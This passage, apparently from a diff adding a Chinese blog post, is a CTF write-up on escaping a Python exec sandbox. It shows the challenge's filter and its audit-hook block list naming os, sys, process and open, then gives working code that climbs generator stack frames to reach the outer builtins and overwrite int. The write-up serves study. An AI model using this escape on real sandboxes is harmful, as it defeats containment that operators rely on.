+</span></span><span class="line"><span class="cl">    <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="s2">&#34;__&#34;</span> <span class="ow">in</span> <span class="n">codes</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;__ bypass!!&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">codes</span><span class="o">+=</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">res=factorization(c)&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">codes</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">locals</span><span class="o">=</span><span class="p">{</span><span class="s2">&#34;c&#34;</span><span class="p">:</span><span class="s2">&#34;696287028823439285412516128163589070098246262909373657123513205248504673721763725782111252400832490434679394908376105858691044678021174845791418862932607425950200598200060291023443682438196296552959193310931511695879911797958384622729237086633102190135848913461450985723041407754481986496355123676762688279345454097417867967541742514421793625023908839792826309255544857686826906112897645490957973302912538933557595974247790107119797052793215732276223986103011959886471914076797945807178565638449444649884648281583799341879871243480706581561222485741528460964215341338065078004726721288305399437901175097234518605353898496140160657001466187637392934757378798373716670535613637539637468311719923648905641849133472394335053728987186164141412563575941433170489130760050719104922820370994229626736584948464278494600095254297544697025133049342015490116889359876782318981037912673894441836237479855411354981092887603250217400661295605194527558700876411215998415750392444999450257864683822080257235005982249555861378338228029418186061824474448847008690117195232841650446990696256199968716183007097835159707554255408220292726523159227686505847172535282144212465211879980290126845799443985426297754482370702756554520668240815554441667638597863&#34;</span><span class="p">,</span><span class="s2">&#34;__builtins__&#34;</span><span class="p">:</span> <span class="kc">None</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="n">res</span><span class="o">=</span><span class="nb">set</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">blackFunc</span><span class="p">(</span><span class="n">oldexit</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">func</span><span class="p">(</span><span class="n">event</span><span class="p">,</span> <span class="n">args</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="n">blackList</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&#34;process&#34;</span><span class="p">,</span><span class="s2">&#34;os&#34;</span><span class="p">,</span><span class="s2">&#34;sys&#34;</span><span class="p">,</span><span class="s2">&#34;interpreter&#34;</span><span class="p">,</span><span class="s2">&#34;cpython&#34;</span><span class="p">,</span><span class="s2">&#34;open&#34;</span><span class="p">,</span><span class="s2">&#34;compile&#34;</span><span class="p">,</span><span class="s2">&#34;__new__&#34;</span><span class="p">,</span><span class="s2">&#34;gc&#34;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">blackList</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">i</span> <span class="ow">in</span> <span class="p">(</span><span class="n">event</span> <span class="o">+</span> <span class="s2">&#34;&#34;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">s</span><span class="p">)</span> <span class="k">for</span> <span class="n">s</span> <span class="ow">in</span> <span class="n">args</span><span class="p">))</span><span class="o">.</span><span class="n">lower</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">                <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;noooooooooo&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                <span class="nb">print</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                <span class="n">oldexit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">func</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">code</span> <span class="o">=</span> <span class="nb">compile</span><span class="p">(</span><span class="n">codes</span><span class="p">,</span> <span class="s2">&#34;&lt;judgecode&gt;&#34;</span><span class="p">,</span> <span class="s2">&#34;exec&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">sys</span><span class="o">.</span><span class="n">addaudithook</span><span class="p">(</span><span class="n">blackFunc</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">_exit</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">exec</span><span class="p">(</span><span class="n">code</span><span class="p">,{</span><span class="s2">&#34;__builtins__&#34;</span><span class="p">:</span> <span class="kc">None</span><span class="p">},</span><span class="nb">locals</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="nb">locals</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">=</span><span class="nb">int</span><span class="p">(</span><span class="nb">locals</span><span class="p">[</span><span class="s2">&#34;res&#34;</span><span class="p">][</span><span class="mi">0</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="n">q</span><span class="o">=</span><span class="nb">int</span><span class="p">(</span><span class="nb">locals</span><span class="p">[</span><span class="s2">&#34;res&#34;</span><span class="p">][</span><span class="mi">1</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="n">p</span><span class="o">&gt;</span><span class="mf">1e5</span> <span class="ow">and</span> <span class="n">q</span><span class="o">&gt;</span><span class="mf">1e5</span> <span class="ow">and</span> <span class="n">p</span><span class="o">*</span><span class="n">q</span><span class="o">==</span><span class="nb">int</span><span class="p">(</span><span class="s2">&#34;696287028823439285412516128163589070098246262909373657123513205248504673721763725782111252400832490434679394908376105858691044678021174845791418862932607425950200598200060291023443682438196296552959193310931511695879911797958384622729237086633102190135848913461450985723041407754481986496355123676762688279345454097417867967541742514421793625023908839792826309255544857686826906112897645490957973302912538933557595974247790107119797052793215732276223986103011959886471914076797945807178565638449444649884648281583799341879871243480706581561222485741528460964215341338065078004726721288305399437901175097234518605353898496140160657001466187637392934757378798373716670535613637539637468311719923648905641849133472394335053728987186164141412563575941433170489130760050719104922820370994229626736584948464278494600095254297544697025133049342015490116889359876782318981037912673894441836237479855411354981092887603250217400661295605194527558700876411215998415750392444999450257864683822080257235005982249555861378338228029418186061824474448847008690117195232841650446990696256199968716183007097835159707554255408220292726523159227686505847172535282144212465211879980290126845799443985426297754482370702756554520668240815554441667638597863&#34;</span><span class="p">)):</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Correct!&#34;</span><span class="p">,</span><span class="n">end</span><span class="o">=</span><span class="s2">&#34;&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Wrong!&#34;</span><span class="p">,</span><span class="n">end</span><span class="o">=</span><span class="s2">&#34;&#34;</span><span class="p">)</span></span></span></code></pre></div></div><p>就是可以执行一些命令，满足下面的if条件就行。</p>
+<p>做了一些过滤，过滤掉了双下划线，<code>{&quot;__builtins__&quot;: None}</code> 置空了<code>__builtins__</code>。</p>
+<p>这里的if条件是：首先p和q都得大于100000，其次就是p和q的积为int(&ldquo;69&hellip;97863&rdquo;)</p>
+<p>按照题目要求，如果通过算法在要求的5秒实现基本上是不可能的，但是我们可以通过沙箱外的globals的<code>__builtins__</code>字段去修改int函数，实现绕过if语句，这道题的解题思路就是通过栈帧对象逃逸出沙箱从而获取到沙箱外的globals。</p>
+<p>由于这里的<code>{&quot;__builtins__&quot;: None}</code> 置空了<code>__builtins__</code>，那么就无法使用next()和send()了。但还可以使用生成器的表达式，为什么必须用生成器，主要还是因为它的属性gi_frame可以获得当前栈帧对象，当然sys._getframe()等也可以获得栈帧对象，不过需要引入sys模块。</p>
+<p>用生成器的表达式获得栈帧对象</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-chevron-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="复制到剪贴板"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">a</span><span class="o">=</span><span class="p">(</span><span class="n">a</span><span class="o">.</span><span class="n">gi_frame</span><span class="o">.</span><span class="n">f_back</span><span class="o">.</span><span class="n">f_back</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="p">[</span><span class="mi">1</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">a</span><span class="o">=</span><span class="p">[</span><span class="n">x</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">a</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">a</span><span class="p">)</span></span></span></code></pre></div></div><p>简单解释一下：看来上面的生成器表达式这里其实就是，先执行i=1，然后执行a.gi_frame.f_back.f_back，这里并没有用到生成器的特性，只是单纯利用生成器来获得栈帧属性。</p>
+<p><code>a=[x for x in a][0]</code>等价于<code>next(a)</code>和<code>list(a)</code>，就是迭代执行嘛。至于两个f_back是从下依次向上返回。</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-chevron-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="复制到剪贴板"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="o">&lt;</span><span class="n">frame</span> <span class="n">at</span> <span class="mh">0x000001C18B6BA130</span><span class="p">,</span> <span class="n">file</span> <span class="s1">&#39;D:</span><span class="se">\\</span><span class="s1">yinwenmingtwo</span><span class="se">\\</span><span class="s1">PythonCode</span><span class="se">\\</span><span class="s1">测试</span><span class="se">\\</span><span class="s1">22.py&#39;</span><span class="p">,</span> <span class="n">line</span> <span class="mi">4</span><span class="p">,</span> <span class="n">code</span> <span class="o">&lt;</span><span class="n">module</span><span class="o">&gt;&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="n">frame</span> <span class="n">at</span> <span class="mh">0x0000027CB3830580</span><span class="p">,</span> <span class="n">file</span> <span class="s1">&#39;D:</span><span class="se">\\</span><span class="s1">yinwenmingtwo</span><span class="se">\\</span><span class="s1">PythonCode</span><span class="se">\\</span><span class="s1">测试</span><span class="se">\\</span><span class="s1">22.py&#39;</span><span class="p">,</span> <span class="n">line</span> <span class="mi">3</span><span class="p">,</span> <span class="n">code</span> <span class="o">&lt;</span><span class="n">listcomp</span><span class="o">&gt;&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="n">frame</span> <span class="n">at</span> <span class="mh">0x000001BDF5F45040</span><span class="p">,</span> <span class="n">file</span> <span class="s1">&#39;D:</span><span class="se">\\</span><span class="s1">yinwenmingtwo</span><span class="se">\\</span><span class="s1">PythonCode</span><span class="se">\\</span><span class="s1">测试</span><span class="se">\\</span><span class="s1">22.py&#39;</span><span class="p">,</span> <span class="n">line</span> <span class="mi">1</span><span class="p">,</span> <span class="n">code</span> <span class="o">&lt;</span><span class="n">genexpr</span><span class="o">&gt;&gt;</span></span></span></code></pre></div></div><p>理解到沙箱逃逸全局了后面就没什么了。</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-chevron-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="复制到剪贴板"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">fake_int</span><span class="p">(</span><span class="n">i</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">100001</span> <span class="o">*</span> <span class="mi">100002</span>
+</span></span><span class="line"><span class="cl"><span class="n">a</span><span class="o">=</span><span class="p">(</span><span class="n">a</span><span class="o">.</span><span class="n">gi_frame</span><span class="o">.</span><span class="n">f_back</span><span class="o">.</span><span class="n">f_back</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="p">[</span><span class="mi">1</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="n">a</span><span class="o">=</span><span class="p">[</span><span class="n">x</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">a</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">builtin</span> <span class="o">=</span><span class="n">a</span><span class="o">.</span><span class="n">f_back</span><span class="o">.</span><span class="n">f_back</span><span class="o">.</span><span class="n">f_globals</span><span class="p">[</span><span class="s2">&#34;_&#34;</span><span class="o">*</span><span class="mi">2</span><span class="o">+</span><span class="s2">&#34;builtins&#34;</span><span class="o">+</span><span class="s2">&#34;_&#34;</span><span class="o">*</span><span class="mi">2</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">builtin</span><span class="o">.</span><span class="n">int</span><span class="o">=</span><span class="n">fake_int</span></span></span></code></pre></div></div><p>这里就是重写了int方法来满足if条件。</p>
+<p><strong>参考：</strong></p>
+<p><a href="https://xz.aliyun.com/t/13635?time__1311=mqmxnQ0QiQi%3DDteDsD7md0%3DL5pQzt8q4D&amp;alichlgref=https%3A%2F%2Fwww.google.com%2F#toc-7" target="_blank" rel="noopener noreffer ">https://xz.aliyun.com/t/13635?time__1311=mqmxnQ0QiQi%3DDteDsD7md0%3DL5pQzt8q4D&alichlgref=https%3A%2F%2Fwww.google.com%2F#toc-7</a></p>
+<p><a href="https://fupanc.github.io/2024/06/06/python%E6%A0%88%E5%B8%A7%E9%80%83%E9%80%B8/#%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95" target="_blank" rel="noopener noreffer ">https://fupanc.github.io/2024/06/06/python%E6%A0%88%E5%B8%A7%E9%80%83%E9%80%B8/#%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95</a></p></div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>更新于 2024-06-11</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="分享到 Twitter" data-sharer="twitter" data-url="http://localhost:1313/posts/python%E6%A0%88%E5%B8%A7%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/" data-title="python栈帧沙箱逃逸" data-hashtags="python,沙箱逃逸"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="分享到 Facebook" data-sharer="facebook" data-url="http://localhost:1313/posts/python%E6%A0%88%E5%B8%A7%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/" data-hashtag="python"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/python/">Python</a>,&nbsp;<a href="/tags/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/">沙箱逃逸</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/posts/urldns%E9%93%BE%E5%88%86%E6%9E%90/" class="prev" rel="prev" title="URLDNS链分析"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>URLDNS链分析</a>
+            <a href="/posts/cc1%E9%93%BE%E7%9A%84%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/" class="next" rel="next" title="CC1链的分析与利用">CC1链的分析与利用<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">由 <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.140.1">Hugo</a> 强力驱动 | 主题 - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.3.0"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> LoveIt</a>
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2024 - 2025</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">gaorenyusi</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="回到顶部">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a>
+        </div>
+
+        <div id="fixed-buttons-hidden"><a href="#" id="view-comments" class="fixed-button" title="查看评论">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><script src="/lib/autocomplete/autocomplete.min.js"></script><script src="/lib/lunr/lunr.min.js"></script><script src="/lib/lunr/lunr.stemmer.support.min.js"></script><script src="/lib/lunr/lunr.zh.min.js"></script><script src="/lib/lazysizes/lazysizes.min.js"></script><script src="/lib/clipboard/clipboard.min.js"></script><script src="/lib/sharer/sharer.min.js"></script><script>window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":50},"comment":{},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","lunrLanguageCode":"zh","lunrSegmentitURL":"/lib/lunr/lunr.segmentit.js","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":50,"type":"lunr"}};</script><script src="/js/theme.min.js"></script></body>
+</html>
